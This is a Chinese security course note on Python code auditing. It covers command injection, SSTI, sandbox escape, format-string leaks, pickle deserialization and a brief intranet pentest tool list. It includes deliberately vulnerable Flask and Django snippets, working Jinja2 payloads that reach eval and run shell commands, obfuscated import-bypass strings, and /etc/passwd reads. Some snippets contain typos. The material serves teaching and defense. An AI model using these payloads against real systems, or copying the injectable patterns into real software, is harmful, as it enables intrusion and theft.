---
title: "Python代码审计"
date: 2019-07-30T11:01:03+08:00
tags: [""]
categories: ["系统理论课程", "Xman3夏令营"]
---


## OS命令注入

- 与OS命令注入攻击相关的模块：`eval()`、`os.system()`、`os.popen*`、`subprocess.popenos.spawn*`、`commands.*`、`popen2.*`。

  - 下面是一个用Python中Django写的，可以利用eval命令注入的简单Python Web服务的Demo：

  ```python
  def eval_test(request):
      if request.method == 'GET':
          return render_to_response('eval.html',context_instance=RequesetContext(request))
      elif request.method == 'POST':
          domain = request.POST.get('domain','')
          command = "os.popen('whois" + domain + "')"
          output = eval(command)
      return render_to_response('eval.html', {'output':output.readlines()}, context_instance=RequestContext(request))
  ```
  - OS命令注入：subprocess.call函数（shell=True时，函数会在命令前添加-c选项）。开发建议 &rarr; 使用pipes.quote()函数去过滤用户输入；尽量不要使用shell=True...

  ```python
  subprocess.call("cat " + user_input, shell=True)
  subprocess.call("cat %s"%(user_input), shell=True)
  subprocess.call("cat {0}".format(user_input), shell=True)
  ```

### 简单练习

```python
@app.route("/eval/")
def eval_test():
    ip = request.args.get('ip', '127.0.0.1')
    output = os.popen('ping -c 2' + ip).readlines()
    output = '<br>'.join(output)
    t = Template(output)
    return r.render()
```

## 服务端模板注入（SSTI）

- 发生在MVC框架的view层。

  - 模板注入：`{{9-6}}`，在括号内的内容会被当作Python模板被执行

  ```python
  @app.route("/")
  def index():
      name = request.args.get('name', 'guest')
      t = Template('Hello', name)
      return t.render()
  ```

  - 利用jinjia2语法执行命令：

  ```python
  {% for c in [].__class__.__base__.__subclass__() %}
  	{% if c.__name__ == 'catch_warnings' %}
      {% for b in c.__init__.globals__.values() %}
      	{% if b.__class__ == {}.__class__ %}
          	{% if 'eval' in b.keys() %}
              	{{ b['eval']('__import__("os").popen("id").read()') }}
              {% endif %}
          {% endif %}
      {% endfor %}
      {% endif %}
  {% endfor %}
  ```

  ```python
  [].__class__.__base__.subclasses__()[60].__init__.__globals__.values()[13]['eval']('__import__("os").popen("id").read()')
  ```

- 服务器端模板注入相当于控制了对方的view层，可以获得一切jinja2中可以获取的数据。但此时我们仍然在jinja2的沙箱中，接下来我们需要绕过沙箱。

## Python沙箱逃逸

- 沙箱一般是限制指定函数的运行，或者对指定模块的删除以及过滤

### 任意代码执行

- 一些任意代码执行以及文件读取的函数
  1. os执行系统命令：`os.system('ipconfig')`
  2. exec任意代码执行：`exec('__import__("os").system("ipconfig")')`
  3. eval任意代码执行：`eval('__import__("os").system("ipconfig")')`
  4. timeit &rarr; 本是检测本机性能的，也可以任意代码执行：`timeit.timeit("__import__('os').system('ipconfig')", number=1)`
  5. platform：`platform.popen('ipconfig').read()`
  6. subprocess：`subprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE, stderr=subprocess)`
  7. file：`file('/etc/passwd').read()`
  8. open：`open('/etc/passwd').read()`
  9. codecs：`codecs.open('/etc/passwd').read()`

### 其他攻击方法

- *PS*：Bypass明文过滤源码

```python
import re
pattern = re.complile('(os|commands|subprocess|sys)')
while True:
    code = raw_input('')
    match = re.search(pattern, code)
    if match:
        print("forbidden module import detected.")
    else:
        print("Succ!")
```

- base64编码方式逃逸（只适用于Python2）。例子：

```python
__buildins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))
# 等价于 __buildins__.__dict__['__import__'](os)
```

- 格式化字符串问题。

  1. 在以下代码中，如果用户输入`%(password)s` 就可以获得用户的真实密码了。

  ```python
  userdata = {"user":"jdoe", "password":"secrect"}
  passwd = raw_input("Password:")

  if passwd != userdata["password"]:
      print("Password "+ passwd + " is wrong for user %(user)s")	%userdata
  ```

  2. 在以下代码中可以通过`{event.__init__.__globals__[CONFIG][SECRET_KEY]}` 就可以泄露敏感信息。

  ```python
  CONFIG = {
      'SECRET_KEY': 'super secret key'
  }

  class Event(object):
      def __init__(self, id, level, message):
          self.id = id
          self.level = level
          self.message = message

  def format_event(format_string, event):
      return format_string.format(event=event)
  ```

### 使用del过滤防御

```python
del __builtins__.__dict__['__import__']
del __builtins__.__dict__['eval']
del __builtins__.__dict__['execfile']
del __builtins__.__dict__['input']
# 因为可以绕过del过滤：reload(__buildtins__)，解决办法：
del __builtins__.__dict__['reload']
```
## 反序列化

- `pickle.dump(obj, file[,protocol])` &rarr; 序列化对象，并将结果数据写入到文件对象中（protocol是序列化模式，默认值为0以文本的形式序列化）

- `pickle.load(file)` &rarr; 反序列化对象，将文件中的数据解析成为一个Python对象。
- pickle的典型应用场景：
  1. 通常在解析认证token、session的时候；
  2. 可能将对象Pickle后存储成磁盘文件；
  3. 可能将对象Pickle后在网络中传输；
  4. 可能参数传递给程序，比如一个sqlmap代码执行漏洞。

# 内网渗透

- 预交互、情报搜集、威胁建模、脆弱点分析、漏洞利用、后漏洞利用、撰写报告

## 扫描网络

- 被动信息扫描 &rarr; 开源情报（OSINT）
  - 信息收集框架：Recon-ng、Discover、SpiderFoot、Gitrob-Github
- 端口扫描：Nmap、Zmap、Masccan
- 漏洞扫描：Cobalstrike、Tenable Nessus、Rapid7 Nexpose、OpenVas、Metasploit、Nmap scripts、巡风（偏内网资产审计）
- 漏洞利用：metasploit、meterpreter
- 添加路由：route add/remove subnet_addr

## 域渗透

- 工作组、家庭组
- *P.S.*：信息安全四大顶会，RSAP

